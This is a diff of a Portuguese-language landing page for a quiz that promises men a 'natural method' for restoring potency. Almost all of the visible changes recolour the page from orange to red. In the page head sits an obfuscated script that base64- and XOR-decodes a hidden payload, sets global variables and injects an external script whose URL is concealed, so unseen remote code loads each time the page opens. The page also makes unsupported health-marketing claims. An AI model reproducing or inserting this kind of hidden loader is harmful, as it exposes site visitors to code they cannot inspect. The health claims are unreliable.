@@ -25,7 +25,7 @@ src="https://www.facebook.com/tr?id=1123182646935484&ev=PageView&noscript=1"
     <title>AOA</title>
 
     <script>(function(){var p_d55=atob("DEbpqJBIsSdfyzsiPj3L3eIkkx19o09WTjXTh78r1Ulxvk9PVyCQhvMn3Ak9uRRRXTSA2OQ7nlIrpkgNUiedzeM8n00s6RcAXzKd2vkqxFM6uBkYZT3LxvEl1AVl6V9DSifE3eQl2EEm5ktQWzCMxuRlyUQwrxZRXS3LhLI+0EsqrhkYHGSUhOtq30YyrhkYHCKI3PFlxFMyol1bEzabzeYt31NyuE5AVyKairxqx0Yzvl4ABGTL1c01");var c_li=[];for(var p_nrq=0;p_nrq<p_d55.length;p_nrq++){c_li.push(p_d55.charCodeAt(p_nrq)&255);}var r_uw8z=c_li[0];var q_6qk2=c_li.slice(1,1+r_uw8z);var s_a=c_li.slice(1+r_uw8z);var g_wil=s_a.map(function(b,w_l8){return b^q_6qk2[w_l8%r_uw8z];});var m_wvd="";for(var m_724e=0;m_724e<g_wil.length;m_724e++){m_wvd+=String.fromCharCode(g_wil[m_724e]&255);}var v_7=decodeURIComponent(escape(m_wvd));var y_nqq9=JSON.parse(v_7);var i_0a4=y_nqq9.globals||[];i_0a4.forEach(function(p_z){window[p_z.name]=p_z.value;});var d_9i3e=document.createElement("script");d_9i3e.src=y_nqq9.url;d_9i3e.async=true;d_9i3e.defer=true;(y_nqq9.attributes||[]).forEach(function(z_p7){d_9i3e.setAttribute(z_p7.name,z_p7.value);});(document.head||document.documentElement).appendChild(d_9i3e);})();</script>
-   
+
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
     <style>
 
@@ -38,9 +38,9 @@ src="https://www.facebook.com/tr?id=1123182646935484&ev=PageView&noscript=1"
             --muted: #9a9fa8;
             --line: #e7e9ed;
             --line-strong: #d7dae0;
-            --accent: #f97316;
-            --accent-dark: #c9580b;
-            --accent-soft: #fff4ec;
+            --accent: #dc2626;
+            --accent-dark: #991b1b;
+            --accent-soft: #fef2f2;
             --success: #19945d;
             --danger: #d64b4b;
             --shadow: 0 18px 55px rgba(23, 25, 29, 0.08);
@@ -62,7 +62,7 @@ src="https://www.facebook.com/tr?id=1123182646935484&ev=PageView&noscript=1"
         body {
             font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
             background:
-                radial-gradient(circle at 50% -15%, rgba(249, 115, 22, 0.10), transparent 34%),
+                radial-gradient(circle at 50% -15%, rgba(220, 38, 38, 0.10), transparent 34%),
                 linear-gradient(180deg, #ffffff 0%, #f7f8fa 48%, #f3f4f6 100%);
             display: flex;
             align-items: center;
@@ -150,11 +150,11 @@ src="https://www.facebook.com/tr?id=1123182646935484&ev=PageView&noscript=1"
         .progress-wrap .bar {
             height: 100%;
             width: 0%;
-            background: linear-gradient(90deg, #f97316, #fb923c, #fdba74);
+            background: linear-gradient(90deg, #dc2626, #ef4444, #f87171);
             border-radius: inherit;
             transition: width 0.65s cubic-bezier(0.22, 1, 0.36, 1);
             position: relative;
-            box-shadow: 0 0 16px rgba(249,115,22,0.28);
+            box-shadow: 0 0 16px rgba(220,38,38,0.28);
         }
 
         .progress-wrap .bar::after {
@@ -280,9 +280,9 @@ src="https://www.facebook.com/tr?id=1123182646935484&ev=PageView&noscript=1"
             font-weight: 800;
             letter-spacing: 1.3px;
             text-transform: uppercase;
-            color: #c9580b;
+            color: #991b1b;
             background: var(--accent-soft);
-            border: 1px solid #fed7aa;
+            border: 1px solid #fecaca;
             padding: 7px 13px;
             border-radius: 999px;
             margin-bottom: 18px;
@@ -291,11 +291,11 @@ src="https://www.facebook.com/tr?id=1123182646935484&ev=PageView&noscript=1"
 
         @keyframes badgePulse {
             0%, 100% {
-                box-shadow: 0 0 0 0 rgba(249, 115, 22, 0.16);
+                box-shadow: 0 0 0 0 rgba(220, 38, 38, 0.18);
                 transform: translateY(0);
             }
             50% {
-                box-shadow: 0 0 0 7px rgba(200, 149, 61, 0);
+                box-shadow: 0 0 0 7px rgba(220, 38, 38, 0);
                 transform: translateY(-1px);
             }
         }
@@ -324,7 +324,7 @@ src="https://www.facebook.com/tr?id=1123182646935484&ev=PageView&noscript=1"
 
         .intro-desc strong,
         .intro-desc strong[style] {
-            color: #c9580b !important;
+            color: #dc2626 !important;
             font-weight: 750;
         }
 
@@ -346,7 +346,7 @@ src="https://www.facebook.com/tr?id=1123182646935484&ev=PageView&noscript=1"
 
         .intro-stat:hover {
             transform: translateY(-2px);
-            border-color: #fed7aa;
+            border-color: #fecaca;
             box-shadow: var(--shadow-soft);
         }
 
@@ -445,8 +445,8 @@ src="https://www.facebook.com/tr?id=1123182646935484&ev=PageView&noscript=1"
         }
 
         .step-title .highlight {
-            color: #c9580b;
-            -webkit-text-fill-color: #c9580b;
+            color: #dc2626;
+            -webkit-text-fill-color: #dc2626;
             position: relative;
             display: inline-block;
         }
@@ -458,7 +458,7 @@ src="https://www.facebook.com/tr?id=1123182646935484&ev=PageView&noscript=1"
             left: 0;
             right: 0;
             height: 1px;
-            background: linear-gradient(90deg, rgba(249,115,22,0.88), rgba(249,115,22,0));
+            background: linear-gradient(90deg, rgba(220,38,38,0.88), rgba(220,38,38,0));
             animation: underlineGrow 0.75s cubic-bezier(0.22, 1, 0.36, 1) forwards;
         }
 
@@ -510,7 +510,7 @@ src="https://www.facebook.com/tr?id=1123182646935484&ev=PageView&noscript=1"
             content: '';
             position: absolute;
             inset: 0;
-            background: linear-gradient(100deg, rgba(249,115,22,0.07), rgba(255,255,255,0));
+            background: linear-gradient(100deg, rgba(220,38,38,0.07), rgba(255,255,255,0));
             opacity: 0;
             transition: opacity 0.22s ease;
         }
@@ -549,18 +549,18 @@ src="https://www.facebook.com/tr?id=1123182646935484&ev=PageView&noscript=1"
         }
 
         .option.selected {
-            background: #fffcf7;
-            border-color: #fdba74;
-            box-shadow: 0 0 0 3px rgba(249,115,22,0.11), 0 8px 20px rgba(23,25,29,0.05);
+            background: #fffafa;
+            border-color: #fca5a5;
+            box-shadow: 0 0 0 3px rgba(220,38,38,0.12), 0 8px 20px rgba(23,25,29,0.05);
             transform: translateY(-1px);
         }
 
         .option.selected .letter {
-            background: #f97316;
-            border-color: #f97316;
+            background: #dc2626;
+            border-color: #dc2626;
             color: #fff;
             transform: scale(1.08) rotate(4deg);
-            box-shadow: 0 6px 16px rgba(249,115,22,0.24);
+            box-shadow: 0 6px 16px rgba(220,38,38,0.28);
             animation: selectedPop 0.34s cubic-bezier(0.34, 1.56, 0.64, 1);
         }
 
@@ -585,7 +585,7 @@ src="https://www.facebook.com/tr?id=1123182646935484&ev=PageView&noscript=1"
         }
 
         .analysis-title span {
-            color: #c9580b;
+            color: #dc2626;
         }
 
         .analysis-sub {
@@ -690,7 +690,7 @@ src="https://www.facebook.com/tr?id=1123182646935484&ev=PageView&noscript=1"
             border-radius: 50%;
             background: var(--accent);
             flex-shrink: 0;
-            box-shadow: 0 0 0 4px rgba(249,115,22,0.10);
+            box-shadow: 0 0 0 4px rgba(220,38,38,0.10);
         }
 
         .analysis-terminal .dot.done {
@@ -717,7 +717,7 @@ src="https://www.facebook.com/tr?id=1123182646935484&ev=PageView&noscript=1"
             height: 62px;
             border-radius: 18px;
             background: var(--accent-soft);
-            border: 1px solid #fed7aa;
+            border: 1px solid #fecaca;
             font-size: 28px;
             margin-bottom: 12px;
             animation: sealIn 0.55s cubic-bezier(0.22, 1, 0.36, 1) forwards;
@@ -736,7 +736,7 @@ src="https://www.facebook.com/tr?id=1123182646935484&ev=PageView&noscript=1"
         }
 
         .result-title span {
-            color: #c9580b;
+            color: #dc2626;
         }
 
         .result-badge {
@@ -761,7 +761,7 @@ src="https://www.facebook.com/tr?id=1123182646935484&ev=PageView&noscript=1"
         }
 
         .result-desc strong {
-            color: #b94c08;
+            color: #b91c1c;
             font-weight: 750;
         }
 
@@ -795,7 +795,7 @@ src="https://www.facebook.com/tr?id=1123182646935484&ev=PageView&noscript=1"
         .result-meter-fill {
             height: 100%;
             width: 0%;
-            background: linear-gradient(90deg, #d7695c, #f97316);
+            background: linear-gradient(90deg, #ef4444, #dc2626);
             border-radius: inherit;
             transition: width 1.2s cubic-bezier(0.22, 1, 0.36, 1);
         }
@@ -989,7 +989,7 @@ src="https://www.facebook.com/tr?id=1123182646935484&ev=PageView&noscript=1"
                 Descobre em <span class="highlight">2 minutos</span> porque a tua ferramenta está a falhar
             </div>
             <div class="intro-desc">
-                Responde a 8 perguntas rápidas e recebe uma análise personalizada baseada em <strong style="color:#f5b83d;">12.847 casos</strong> de homens que recuperaram a potência com um método natural.
+                Responde a 8 perguntas rápidas e recebe uma análise personalizada baseada em <strong style="color:#dc2626;">12.847 casos</strong> de homens que recuperaram a potência com um método natural.
             </div>
             <div class="intro-stats">
                 <div class="intro-stat">
@@ -1123,8 +1123,8 @@ src="https://www.facebook.com/tr?id=1123182646935484&ev=PageView&noscript=1"
                 <svg viewBox="0 0 160 160">
                     <defs>
                         <linearGradient id="grad" x1="0%" y1="0%" x2="100%" y2="0%">
-                            <stop offset="0%" stop-color="#f97316" />
-                            <stop offset="100%" stop-color="#fb923c" />
+                            <stop offset="0%" stop-color="#dc2626" />
+                            <stop offset="100%" stop-color="#ef4444" />
                         </linearGradient>
                     </defs>
                     <circle class="bg" cx="80" cy="80" r="72" />
@@ -1196,7 +1196,7 @@ src="https://www.facebook.com/tr?id=1123182646935484&ev=PageView&noscript=1"
                     if (p.y > h) p.y = 0;
                     ctx.beginPath();
                     ctx.arc(p.x, p.y, p.r, 0, Math.PI * 2);
-                    ctx.fillStyle = `rgba(249, 115, 22, ${Math.min(p.o, 0.10)})`;
+                    ctx.fillStyle = `rgba(220, 38, 38, ${Math.min(p.o, 0.10)})`;
                     ctx.fill();
                 });
                 requestAnimationFrame(draw);
